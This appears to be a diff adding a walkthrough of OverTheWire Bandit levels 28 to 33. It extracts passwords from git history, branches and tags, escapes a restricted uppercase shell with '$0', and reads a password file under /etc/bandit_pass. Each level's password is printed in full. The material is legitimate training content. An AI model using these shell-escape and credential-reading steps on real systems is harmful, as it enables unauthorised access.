+commit 6968b2ffdcc317a1aeb2ebfb54259f860a390354
+Author: Ben Dover <noone@overthewire.org>
+Date:   Sat Dec 3 08:14:06 2022 +0000
+
+    initial commit of README.md
+```
+These are the comments from each of the commits to the git repo. And we can see that the second commit says "add missing data". And this is where we need to look inside of. But how? Simple, we can use the following command;  
+
+```
+** We need to copy the "commit" id of the second commit and clone from that commit. **  
+$ git checkout f08ee321c5f564b2da90789fac14b5ae2e55c56c    
+Note: switching to 'f08ee321c5f564b2da90789fac14b5ae2e55c56c'.  
+  
+You are in 'detached HEAD' state. You can look around, make experimental
+changes and commit them, and you can discard any commits you make in this
+state without impacting any branches by switching back to a branch.
+  
+If you want to create a new branch to retain commits you create, you may
+do so (now or later) by using -c with the switch command. Example:
+  
+  git switch -c <new-branch-name>
+  
+Or undo this operation with:
+  
+  git switch -
+  
+Turn off this advice by setting config variable advice.detachedHead to false
+  
+HEAD is now at f08ee32 add missing data
+```
+And now we can easily see that we have reverted back to another time stamp of this repo file from when they added the information we need. Now, all we need to do is cat out the readme file one more time and we should have the intel we seek!  
+```
+$ cat README.md  
+# Bandit Notes
+Some notes for level29 of bandit.
+
+## credentials
+
+- username: bandit29
+- password: tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S
+```
+***BOOM MAGIC CODE BABY!*** And just like that, we have utilized Git commands in order to pull data, change to another commit date/time stamp, and was able to obtain the password we need for bandit29!  
+  
+### Level 29;  
+**Username:** *bandit29*  
+**Password:** *tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S*  
+*Oh look at that. Another git repo that we need to pull and discover. So, let's get those terminals going, and press those keys!*  
+  
+```
+$ mkdir /tmp/cryptoh4ck3r  
+  
+$ cd /tmp/cryptoh4ck3r  
+  
+$ git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo  
+  
+Cloning into 'repo'...
+The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established.
+ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Could not create directory '/home/bandit29/.ssh' (Permission denied).
+Failed to add the host to the list of known hosts (/home/bandit29/.ssh/known_hosts).
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+bandit29-git@localhost's password: 
+remote: Enumerating objects: 16, done.
+remote: Counting objects: 100% (16/16), done.
+remote: Compressing objects: 100% (11/11), done.
+Receiving objects: 100% (16/16), done.
+remote: Total 16 (delta 2), reused 0 (delta 0), pack-reused 0
+
+$ cd repo  
+  
+$ ls  
+README.md  
+  
+$ cat README.md  
+# Bandit Notes
+Some notes for bandit30 of bandit.
+
+## credentials
+
+- username: bandit30
+- password: <no passwords in production!>
+  
+$ git log  
+Author: Ben Dover <noone@overthewire.org>
+Date:   Sat Dec 3 08:14:07 2022 +0000
+
+    fix username
+
+commit 56176349778d7312c603002740f9c2bfc5a530a2
+Author: Ben Dover <noone@overthewire.org>
+Date:   Sat Dec 3 08:14:07 2022 +0000
+
+    initial commit of README.md
+  
+$ git checkout 56176349778d7312c603002740f9c2bfc5a530a2  
+
+Note: switching to '56176349778d7312c603002740f9c2bfc5a530a2'.
+
+You are in 'detached HEAD' state. You can look around, make experimental
+changes and commit them, and you can discard any commits you make in this
+state without impacting any branches by switching back to a branch.
+
+If you want to create a new branch to retain commits you create, you may
+do so (now or later) by using -c with the switch command. Example:
+
+  git switch -c <new-branch-name>
+
+Or undo this operation with:
+
+  git switch -
+
+Turn off this advice by setting config variable advice.detachedHead to false
+
+HEAD is now at 5617634 initial commit of README.md
+  
+$ cat README.md  
+# Bandit Notes
+Some notes for bandit30 of bandit.
+
+## credentials
+
+- username: bandit29
+- password: <no passwords in production!>
+```
+Well this completely sucked! Nothing is there. What do we do now? Well, let's check out the other things we can do in Git;  
+```
+$ git branch  
+* master  
+  
+$ git branch -r  
+  origin/HEAD -> origin/master
+  origin/dev
+  origin/master
+  origin/sploits-dev  
+  
+```
+Now we can see that we have more than 1 branch outside of the master branch. What we need to do is go into these different branches and see what we have. We can do that like so;  
+  
+```
+$ git checkout dev  
+Previous HEAD position was 10dc96b fix username
+Branch 'dev' set up to track remote branch 'dev' from 'origin'.
+Switched to a new branch 'dev'
+  
+$ ls  
+code README.md  
+  
+$ cat README.md  
+# Bandit Notes
+Some notes for bandit30 of bandit.
+
+## credentials
+
+- username: bandit30
+- password: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS
+  
+```
+Is that... Could that... Tell me it is not... Let's copy that password and see if it works!  
+  
+```
+$ exit  
+  
+$ ssh bandit30@13.50.114.40 -p 2220
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+bandit30@13.50.114.40's password: 
+
+      ,----..            ,----,          .---.
+     /   /   \         ,/   .`|         /. ./|
+    /   .     :      ,`   .'  :     .--'.  ' ;
+   .   /   ;.  \   ;    ;     /    /__./ \ : |
+  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
+  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
+  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
+  .   |  ' ' ' : `----'  |  |  \   ;  `      |
+  '   ;  \; /  |     '   :  ;   .   \    .\  ;
+   \   \  ',  /      |   |  '    \   \   ' \ |
+    ;   :    /       '   :  |     :   '  |--"
+     \   \ .'        ;   |.'       \   \ ;
+  www. `---` ver     '---' he       '---" ire.org
+
+
+Welcome to OverTheWire!
+```
+
+***SUPER AWESOME HACKING SKILLS MATE!*** **Even though it was with Git, you still nailed this level!**  
+  
+  
+### Level 30;  
+**Username:** *bandit30*  
+**Password:** *xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS*  
+  
+*Oh look at that. Another Git structure. Okay then. We already know what to do;*  
+  
+```
+$ mkdir /tmp/cryptoh4ck3r  
+  
+$ cd /tmp/cryptoh4ck3r  
+  
+$ git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repo  
+Cloning into 'repo'...
+The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established.
+ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Could not create directory '/home/bandit30/.ssh' (Permission denied).
+Failed to add the host to the list of known hosts (/home/bandit30/.ssh/known_hosts).
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+bandit30-git@localhost's password: 
+remote: Enumerating objects: 4, done.
+remote: Counting objects: 100% (4/4), done.
+remote: Total 4 (delta 0), reused 0 (delta 0), pack-reused 0
+Receiving objects: 100% (4/4), done.
+  
+$ ls  
+repo  
+  
+$ cd repo  
+  
+$ ls  
+README.md  
+  
+$ cat README.md  
+just an epmty file... muahaha  
+  
+$ git log  
+commit 0019ee8c6d6fd1dba2d73666b9e6339ad3314ddb (HEAD -> master, origin/master, origin/HEAD)
+Author: Ben Dover <noone@overthewire.org>
+Date:   Sat Dec 3 08:14:09 2022 +0000
+
+    initial commit of README.md
+  
+  
+$ git branch -r  
+
+  origin/HEAD -> origin/master
+  origin/master
+
+$ git tag  
+secret  
+```
+OH BOY! Did we find the secret tag for this? But how do we use the tag in order to see what the password is?  
+Well, we can do the following;  
+```
+$ git show secret  
+OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt  
+```
+And boom! There you go!  
+  
+### Level 31;  
+**Username:** *bandit31*  
+**Password:** *OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt*  
+  
+*Oh look. Another git challenge. I think they are doing this so that we can learn all about Git and show us how we can use Git to extract sensitive data!*  
+  
+You know the drill. Let's get cloning!  
+```
+$ mkdir /tmp/cryptoh4ck3r  
+  
+$ cd /tmp/cryptoh4ck3r  
+  
+$ git clone ssh://bandit31-git@localhost:2220/home/bandit31-git/repoCloning into 'repo'...
+The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established.
+ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Could not create directory '/home/bandit31/.ssh' (Permission denied).
+Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts).
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+bandit31-git@localhost's password: 
+remote: Enumerating objects: 4, done.
+remote: Counting objects: 100% (4/4), done.
+remote: Compressing objects: 100% (3/3), done.
+remote: Total 4 (delta 0), reused 0 (delta 0), pack-reused 0
+Receiving objects: 100% (4/4), 381 bytes | 381.00 KiB/s, done.
+  
+$ ls  
+repo  
+  
+$ cd repo  
+  
+$ ls  
+README.md  
+  
+$ cat README.md  
+This time your task is to push a file to the remote repository.
+
+Details:
+    File name: key.txt
+    Content: 'May I come in?'
+    Branch: master
+```
+Strange. It says;  
+"This time your task is to push a file to the remote repository."  
+What could this mean? We simply need to create, or edit, a file and push the repo back to the main server!  
+It also tells us the details of what we need to use inside of the file.
+  
+So let's get started.   
+  
+However, there is something else I am sure of it. If we do something like (ls -la) we can see ALL files and folders in our directory. Let's see what we have first.  
+WHY? Because if we are to push a file back to the original git, we need to see if there is anything specific we need to do. Let's look and see what we have?  
+```
+$ ls -la  
+total 20
+drwxrwxr-x 3 bandit31 bandit31 4096 Dec 27 17:16 .
+drwxrwxr-x 3 bandit31 bandit31 4096 Dec 27 17:16 ..
+drwxrwxr-x 8 bandit31 bandit31 4096 Dec 27 17:16 .git
+-rw-rw-r-- 1 bandit31 bandit31    6 Dec 27 17:16 .gitignore
+-rw-rw-r-- 1 bandit31 bandit31  147 Dec 27 17:16 README.md
+```
+And there is a .gitignore. This may be something useful to us. .gitignore will not allow anything inside to be pushed to the server. Let's take a look;  
+```
+$ cat .gitignore  
+*.txt
+```
+AHA! So, we can either remove this or we can create something else. But to be on the easy side, we can just remove this file.  
+```
+$ rm .gitignore  
+```
+And now we are going to create a text file and push it to the server;  
+```
+$ echo "May I come in?" > key.txt  
+  
+** Now that we created the key.txt file (As directed in the README.md Notes), we will push to git; **  
+  
+$ git add .  
+  
+$ git commit -m "Added key.txt file")  
+  
+$ git push   
+  
+The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established.
+ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Could not create directory '/home/bandit31/.ssh' (Permission denied).
+Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts).
+                         _                     _ _ _   
+                        | |__   __ _ _ __   __| (_) |_ 
+                        | '_ \ / _` | '_ \ / _` | | __|
+                        | |_) | (_| | | | | (_| | | |_ 
+                        |_.__/ \__,_|_| |_|\__,_|_|\__|
+                                                       
+
+                      This is an OverTheWire game server. 
+            More information on http://www.overthewire.org/wargames
+
+bandit31-git@localhost's password: 
+Enumerating objects: 4, done.
+Counting objects: 100% (4/4), done.
+Delta compression using up to 2 threads
+Compressing objects: 100% (2/2), done.
+Writing objects: 100% (3/3), 297 bytes | 297.00 KiB/s, done.
+Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
+remote: ### Attempting to validate files... ####
+remote: 
+remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
+remote: 
+remote: Well done! Here is the password for the next level:
+remote: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y 
+remote: 
+remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
+remote: 
+To ssh://localhost:2220/home/bandit31-git/repo
+ ! [remote rejected] master -> master (pre-receive hook declined)
+error: failed to push some refs to 'ssh://localhost:2220/home/bandit31-git/repo'
+```
+***BOOM!!!!*** We just got the password we are looking for! Look at where it says;  
+  
+```
+remote: Well done! Here is the password for the next level:
+remote: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y 
+```
+  
+  
+### Level 32;  
+**Username:** *bandit32*  
+**Password:** *rmCBvG56y58BXzv98yZGdO7ATVL5dW8y*  
+  
+*According to the website, the hint we have is rather basic & bland.*  
+"After all this git stuff, its time for another escape. Good Luck!"  
+  
+***WHAT!!!*** What does this mean? As we connect to bandit32, we can see that we are using the UPPERCASE SHELL. Oh this is all new to us. Let's discover what this is!  
+  
+**Basically, what this UPPERCASE SHELL is that it does not handle the normal commands (ls | cat | etc.). So we need to Google search UPPERCASE SHELL commands and get used to it all.**  
+  
+*Now that you did your research on UPPERCASE SHELL, we can get going.*  
+What we can do, is we can go to a normal shell by doing the following;  
+```
+>> $0  
+  
+$  
+  
+**Time to see if it works;** 
+  
+$ ls  
+uppershell
+```
+  
+So we can see that we can get out of the UPPERCASE SHELL just by typing in "$0". But what do we do here?  
+What we are going to do now, is we are going to export the shell into /bin/bash and then we will be able to do what we need/want to do to this server. Let's see how we should do this;  
+```
+>> $0  
+  
+$ export SHELL=/bin/bash  
+  
+$ $SHELL  
+  
+bandit33@bandit:~$
+```
+
+Okay, so now what do we do? This may be simple for us, but let's check something.   
+Do you remember a few challenges back, we where able to extract the passwords from /etc/bandit_pass/bandit#? Well, let's see if we can cat the password for bandit33!  
+```
+$ cat /etc/bandit_pass/bandit33  
+odHo63fHiFqcWWJG9rLiLDtPm45KzUKy  
+```
+Okay. This is **AWESOME**! Now go test it out and see if it works!  
+  
+### Level 33;  
+**Username:** *bandit33*  
+**Password:** *odHo63fHiFqcWWJG9rLiLDtPm45KzUKy*  
+*According to the site, Level (33 -> 34) does not exist. So. This looks like the end of these challenges for now!*  
+
+That was so much fun! Let's do another one soon!
